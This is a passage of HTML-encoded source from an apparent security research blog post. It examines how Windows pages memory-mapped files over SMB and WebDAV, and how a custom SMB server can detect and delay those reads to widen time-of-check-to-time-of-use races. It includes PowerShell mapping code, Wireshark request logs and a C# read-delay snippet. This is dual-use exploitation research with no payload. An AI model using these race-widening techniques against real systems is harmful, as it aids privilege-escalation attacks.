class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The first thought I had was to try to exploit &lt;/span&gt;&lt;span class="c1"&gt;Multiple UNC Provider (MUP)&lt;/span&gt;&lt;span&gt;&amp;nbsp;clients. When you access a file via a UNC path, e.g. &lt;/span&gt;&lt;span class="c1"&gt;\\server\share\file.bin, &lt;/span&gt;&lt;span class="c0"&gt;this will be handled by a MUP driver in the kernel, which will pass it to one of the registered client drivers. As far as the kernel is concerned the opened file is a regular file (with some caveats) which generally means the file can be mapped into memory. However, any requests for the contents of that file will not be handled directly, but instead handled by a server over a network protocol.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Ideally we should be able to implement our own server, handle the read or write requests to a file mapping which will allow us to detect or delay the request so that we can exploit any TOCTOU. &lt;/span&gt;&lt;span&gt;The following table contains only Microsoft MUP drivers that I identified. The table contains what versions of Windows 10 the driver is supported on and whether it&amp;rsquo;s something enabled by default.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.311f22f71e251be4fa8b2991f349fb7079737414"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c2 c42" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c26"&gt;Remote File System&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34 c42" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c26"&gt;Supported Version&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23 c42" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c26"&gt;Default?&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962"&gt;SMB&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Everything&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Yes (SMBv1 might be disabled)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://tools.ietf.org/html/rfc4918"&gt;WebDAV&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Everything&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Yes (except Server SKUs)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows-server/storage/nfs/nfs-overview"&gt;NFS&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Everything&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://www.tiraniddo.dev/2019/07/digging-into-wsl-p9-file-system.html"&gt;P9&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Windows 10 1903&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;No (needs WSL)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdsod/072543f9-4bd4-4dc6-ab97-9a04bf9d2c6a"&gt;Remote Desktop Client&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Everything&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;While MUP was designed for remote file systems there&amp;rsquo;s no requirement that the file system server is actually remote. SMB, WebDAV and NFS are IP based protocols and can be redirected to localhost. P9 uses a local Unix Socket which can&amp;rsquo;t be remoted anyway. The terminal services client sends file access requests back to the client system over the RDP protocol. For all these protocols we can implement the server with varying degrees of effort and see if we can detect and delay reads and writes to the file mapping.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;I decided to focus only on two, SMB and WebDAV. These were the only two which are enabled by default and are trivially usable. While the Remote Desktop Client is in theory installed by default the RDP server is not normally enabled by default. Also setting up the RDP session is complex and might require valid authentication credentials therefore I decided against it.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.b9zmr45b126"&gt;&lt;span class="c36"&gt;Server Message Block&lt;/span&gt;&lt;/h3&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;SMB is almost as old as Windows itself, having been introduced in Lan Manager 1.0 back in 1987. The latest SMB version 3.1 protocol only bears a passing resemblance to that original version having shed its NetBIOS roots for a TCP/IP connection. Its lineage does mean it&amp;rsquo;s the best integrated of any of the network file systems, with the MUP APIs being designed around the needs of SMB.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;I decided to do a simple test of the behavior of mapping a file over SMB. This is fairly easy as you can access SMB on the same machine via localhost. I first created a 1GiB file on a local disk, the rationale being if SMB supports caching file data it&amp;rsquo;s unlikely to read something that large in one go. I then started &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;and monitored the loopback interface to capture the SMB traffic as shown below.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c11 c1"&gt;&lt;a href="https://1.bp.blogspot.com/-vXhkSagBdBU/YAhvVDfEscI/AAAAAAAAaqo/1IIZjYYR2MULMA1tGOTBNs5a6ssC1VLLQCNcBGAsYHQ/s957/image1%2B%25281%2529.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-vXhkSagBdBU/YAhvVDfEscI/AAAAAAAAaqo/1IIZjYYR2MULMA1tGOTBNs5a6ssC1VLLQCNcBGAsYHQ/s600/image1%2B%25281%2529.png" border="0" alt="Overview diagram of SMB test with wireshark in place to inspect the network traffic from the SMB client to the SMB server. The diagram starts overview with a user application reading memory of a mapped file which causes a page fault. As the file is on an SMB share this calls into the SMB client which sends a request to the SMB server and from there to the file system. In between the SMB client and SMB server components the Wireshark logo indicates where we are monitoring the network traffic." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;I then wrote a quick PowerShell script which will map the file into memory and then reads a few bytes from memory at a few different offsets.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c8c8c2cba13a8921ac57c2f036ed9a8e5123c4d1"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c6"&gt;&lt;span class="c14"&gt;Use-NtObject&lt;/span&gt;&lt;span class="c17 c25"&gt;(&lt;/span&gt;&lt;span class="c17 c18"&gt;$f&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c22"&gt;=&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c14"&gt;Get-NtFile&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c35 c25"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c17 c35 c25 c38"&gt;\\localhost\c$\root\file.bin&lt;/span&gt;&lt;span class="c17 c25 c35"&gt;&amp;quot;&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;-Win32Path&lt;/span&gt;&lt;span class="c3"&gt;) {&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c25"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c14"&gt;Use-NtObject&lt;/span&gt;&lt;span class="c17 c25"&gt;(&lt;/span&gt;&lt;span class="c17 c18"&gt;$s&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c22"&gt;=&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c14"&gt;New-NtSection&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;-File&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c18"&gt;$f&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;-Protection&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c43 c25"&gt;ReadWrite&lt;/span&gt;&lt;span class="c3"&gt;) {&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c25"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c14"&gt;Use-NtObject&lt;/span&gt;&lt;span class="c17 c25"&gt;(&lt;/span&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c22"&gt;=&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c14"&gt;Add-NtSection&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;-Section&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c18"&gt;$s&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;-Protection&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c25 c43"&gt;ReadWrite&lt;/span&gt;&lt;span class="c3"&gt;) {&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c18"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;0&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c18"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;256&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c25"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;512&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c18"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; $m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;768&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c25"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;This just reads 4 bytes from offset, 0, 256MiB, 512MiB and 768MiB. Going back to Wireshark I filtered the output to only SMBv2 read requests using the display filter &lt;/span&gt;&lt;span class="c1"&gt;smb2.cmd == 8&lt;/span&gt;&lt;span class="c0"&gt;, and the following four packets can be observed.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.781998ecbfdfd185ba84b304b816e4ca702e5afc"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;Read Request Len:32768 Off:0 File: root\file.bin&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;Read Request Len:32768 Off:268435456 File: root\file.bin&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;Read Request Len:32768 Off:536870912 File: root\file.bin&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;Read Request Len:32768 Off:805306368 File: root\file.bin&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c6 c7"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;This corresponds with the exact memory offsets we accessed in the script although the length is always 32KiB in size, not the 4 we requested. Note, that it&amp;rsquo;s not the typical Windows memory allocation granularity of 64KiB which you might expect. In my testing I&amp;rsquo;ve never seen anything other than 32KiB requested. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;All the bytes we&amp;rsquo;ve tested are aligned to the 32KiB block, what if the bytes were not aligned, for example if we accessed 4 bytes from address 512MiB minus 2? Changing the script to add the following allows us to check the behavior:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fa7dd910dbb19e5fd97872373baa2a6c49afee7e"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c6"&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;Read&lt;/span&gt;&lt;span class="c17 c25"&gt;Bytes(&lt;/span&gt;&lt;span class="c12"&gt;512&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024 - 2&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c17 c25"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;In Wireshark we see the following read requests.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fa304928ef3c31dda5574da10e2deacc43708368"&gt;&lt;/a&gt;&lt;a id="t.5"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;Read Request Len:32768 Off:536838144 File: root\file.bin&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;Read Request Len:32768 Off:536870912 File: root\file.bin&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The accesses are still at 32KiB boundaries, however as the request straddles two blocks the kernel has fetched the preceding 32KiB of data from the file and then the following 32KiB. You might think that all makes sense, however this behavior turned out to be a fluke of testing. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-zjE_Vx7-iOk/YAhvVfwuRbI/AAAAAAAAaq0/DvDY-3j1fw8Qg75Z_wFlAMJctgM98jpOQCNcBGAsYHQ/s656/image5.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-zjE_Vx7-iOk/YAhvVfwuRbI/AAAAAAAAaq0/DvDY-3j1fw8Qg75Z_wFlAMJctgM98jpOQCNcBGAsYHQ/s600/image5.png" border="0" alt="&lt;/span&gt;&lt;span class="c11 c1"&gt;Overview diagram of memory read layout. In the middle is a set of boxes representing the native 4KiB pages being read. All the boxes are contained within a single larger region which is the large page size. Above the boxes are arrows which show that from the base of the 4KiB box a 32KiB read will be made into the file which can satisfy the reads from other 4KiB pages. The final box shows that the last 32KiB of the large page size will always be read as a single page regardless of where in the box the read occurs." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c11 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The diagram above shows the structure of how mapped file reads are handled. When an address is read the kernel will request 32KiB from the closest 4KiB page boundary, not the 32KiB boundary. However, there&amp;rsquo;s then a secondary structure on top based on the supported size of &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/memory/large-page-support"&gt;large pages&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. If the read is anywhere within 32KiB of the end of a large page the read offset is always for the last 32KiB.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;For example, on my system the large page size (as queried using the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-getlargepageminimum"&gt;GetLargePageMinimum&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;API) is 2MiB. Therefore if you start at offset 512MiB, between 512 and 514 - 32KiB the kernel will read 32KiB from the offset truncated to the closest 4KiB boundary. Between 514 - 32KiB and 514MiB the read will always request offset 514 - 32KiB so that the 32KiB doesn&amp;rsquo;t cross the large page boundary.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;This allows reads at 4KiB boundaries, however the amount of data read is still 32KiB. This means that once one 4KiB page is accessed the kernel will populate the current page and 7 following pages. Is there any way to only populate a single native page? Based on a comment from Mateusz I tested returning short reads. If the SMB server returns fewer bytes than requested from the read then rather than failing it only populates the pages covered by the read. By returning these short reads we can get trap granularity down to the native page size except for the final 32KiB of a large page. If a read request is shorter than the native page size the rest of the page is zeroed.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;What about writing? Let&amp;rsquo;s change the script again to call &lt;/span&gt;&lt;span class="c1"&gt;WriteBytes&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than &lt;/span&gt;&lt;span class="c1"&gt;ReadBytes&lt;/span&gt;&lt;span class="c0"&gt;, for example:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3d062bd046e65f691bd1dc2383ef68ff5ba76daa"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c6"&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;WriteBytes(&lt;/span&gt;&lt;span class="c12"&gt;256&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;@(0xAA, 0xBB, 0xCC, 0xDD)&lt;/span&gt;&lt;span class="c17 c25"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;You will see a write request to the file in Wireshark, similar to the following:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.6278e8d0815ac87f566ed149df8683a184989b46"&gt;&lt;/a&gt;&lt;a id="t.7"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;Write Request Len:4096 Off:268435456 File: root\file.bin&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;However, if you dig a bit deeper you&amp;rsquo;ll notice that the write only happens once the file is closed, not in response to the WriteBytes call. &lt;/span&gt;&lt;span&gt;This makes sense, there isn&amp;rsquo;t any easy way to detect when the write happened to force the page to be flushed back to the file system. Even if there was a way flushing to a network server for every write would have a massive performance impact.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;All is not lost however, before the memory is safe to write it must be populated with the contents from the file. Therefore if you look before the write you&amp;rsquo;ll see a corresponding read request for the 32KiB region which encompasses the write location which is synchronous with the read. You can detect a write through its corresponding read but you can&amp;rsquo;t distinguish read from a write at the protocol level.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;All this testing indicates if we have control over the server we can detect memory access to the mapped file. Can we delay the access as well? I wrote a simple SMB server in .NET 5 using the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://github.com/TalAloni/SMBLibrary"&gt;SMBLibrary&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;by Tal Aloni. I implemented the server with a custom filesystem handler and added some code to the read path which delays for 10 seconds when the file offset is greater than 512MiB.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e19ea66214a46277c033fbe4e211e29447cdcd32"&gt;&lt;/a&gt;&lt;a id="t.8"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c6"&gt;&lt;span class="c14"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;(Position &amp;gt;= (512 * 1024 * 1024)) {&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c25"&gt;&amp;nbsp; &amp;nbsp; Console.WriteLine(&lt;/span&gt;&lt;span class="c17 c41 c25"&gt;&amp;quot;====&amp;gt; Delaying at Position {0:X}&amp;quot;&lt;/span&gt;&lt;span class="c3"&gt;, Position);&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; Thread.Sleep(10000);&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 